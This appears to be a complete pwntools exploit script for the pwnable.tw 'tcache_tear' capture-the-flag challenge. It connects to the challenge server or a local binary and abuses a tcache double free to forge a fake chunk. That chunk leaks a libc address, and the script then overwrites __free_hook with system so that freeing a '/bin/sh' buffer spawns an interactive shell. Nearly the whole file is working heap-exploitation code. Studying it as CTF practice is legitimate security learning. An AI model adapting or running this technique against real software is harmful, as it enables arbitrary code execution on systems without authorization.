#coding:utf-8
from pwn import *
# import pwn_framework as pf
from time import sleep

global io
ru = lambda p, x : p.recvuntil(x)
sn = lambda p, x : p.send(x)
rl = lambda p  : p.recvline()
sl = lambda p, x : p.sendline(x)
rv = lambda p, x=1024 : p.recv(numb = x)
sa = lambda p, a, b : p.sendafter(a,b)
sla = lambda p, a, b : p.sendlineafter(a,b)
rr = lambda p, t : p.recvrepeat(t)

# amd64 or x86
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

filename = "./tcache_tear"
ip = "chall.pwnable.tw"
port = 10207

LOCAL = True if len(sys.argv)==1 else False

global bps # Break Points
global gds # Gdb Debug Symbols
bps = []
gds = {}

elf = ELF(filename)

remote_libc = "./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so"
if LOCAL:
    io = process(filename)
    # libc = elf.libc

    # # if LD_PRELOAD multiple libs, split with ':'
    # io = process(["./ld-2.29.so", filename], env={'LD_PRELOAD': remote_libc}) 
    libc = ELF(remote_libc)
else:
    context.log_level = 'debug'
    io = remote(ip, port)
    libc = ELF(remote_libc)
    # libc = elf.libc


def mydebug(p, s=''):
    def _get_bstr():
        global bps
        b_str =""
        for break_point in bps:
            if type(break_point) == int:
                b_str += "b *%s\n"%(hex(break_point))
            elif type(break_point) == str:
                b_str += "b %s\n"%(break_point)
            else:
                pause(p, "[_get_bstr] unsupported break point type : "+str(break_point))
        return b_str
    def _get_gds_str():
        global gds
        res = ""
        for name in gds:
            val = gds[name]
            if type(name) != str:
                pause(p, "[_get_gds_str] unsupported name type : "+str(type(name)))
            if type(val) != int:
                pause(p, "[_get_gds_str] unsupported val type : "+str(type(val)))
            res += "set $%s=%d\n"%(name, gds[name])
        return res
    if not LOCAL:
        return
    gdb.attach(p, _get_bstr()+_get_gds_str()+s)

def pause(p, s = 'pause'):
    if LOCAL:
        print('pid: ' + str(p.pid))
        return raw_input(s)
    else:
        return raw_input(s)

def choice(p, idx):
    sla(p, "Your choice :", str(idx))

def lg(name, val):
    log.info(name+" : "+hex(val))

def add(io, size, con):
    choice(io, 1)
    sla(io, "Size:", str(size))
    sa(io, "Data:", con)

def show(io,):
    choice(io, 3)

def remove(io,):
    choice(io, 2)

bps.append("*0x400C54")  
gds['data']=0x4040B0

name = 0x602060

sla(io, "Name:", b'aaa')


add(io, 0x50, b'b'*0x8)

mydebug(io, 'c\nc\nset *0x603268=1\nc\nc\nset *0x6032c8=1\nc\nc')

remove(io)
remove(io)

add(io, 0x50, p64(name+0x500))
add(io, 0x50, p64(0xbabecafe))


pay = p64(0) + p64(0x21) + p64(0)*3 + p64(0x21)
add(io, 0x50, pay)



add(io, 0x60, b'b'*0x8)

remove(io)
remove(io)

add(io, 0x60, p64(name))
add(io, 0x60, p64(0xbabecafe))

pay = p64(0x0) + p64(0x501)
add(io, 0x60, pay.ljust(0x28, b'\x00') + p64(name+0x10))

remove(io)
show(io)

ru(io, "Name :")
rv(io, 0x10)
libc_addr = u64(rv(io, 8))
libc_base = libc.address = libc_addr - 0x3ebca0
fh = libc.sym['__free_hook']
system = libc.sym['system']
log.info("libc_addr 0x%x", libc_addr)
log.info("libc_base 0x%x", libc_base)
log.info("fh 0x%x", fh)
log.info("system 0x%x", system)
input()


add(io, 0x30, b'b'*0x8)


remove(io)
remove(io)

add(io, 0x30, p64(fh))
add(io, 0x30, p64(0xbabecafe))
add(io, 0x30, p64(system))

add(io, 0x20, b'/bin/sh\x00')
remove(io)

io.interactive()